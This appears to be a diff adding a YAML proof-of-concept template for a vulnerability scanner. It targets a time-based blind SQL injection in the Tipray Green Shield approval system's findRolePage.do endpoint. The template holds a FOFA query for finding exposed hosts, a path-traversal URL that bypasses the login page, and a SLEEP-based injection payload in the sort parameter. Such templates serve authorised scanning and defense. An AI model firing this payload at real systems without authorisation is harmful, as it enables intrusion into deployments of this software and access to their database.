@@ -1,0 +1,21 @@
+id: poc-yaml-tipray-gsas-findrolepage-do-sqli
+info:
+  name: 天锐绿盾审批系统 findRolePage.do SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 天锐绿盾审批系统
+  fofa: app="TIPPAY-绿盾审批系统"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /trwfe/login.jsp/.%2e/role/findRolePage.do
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: sort=id+OR+(SELECT+1337+FROM+(SELECT(SLEEP({{.t1}})))test)&order=asc
+  expression: status_code == 200 && contains(body,"\"total\":") && contains(body,"\"role_admin\"")
+    && contains(body,"\"role_user\"") && !contains(body,"<") && duration >= t1 &&
+    duration <= t2
+transport: http
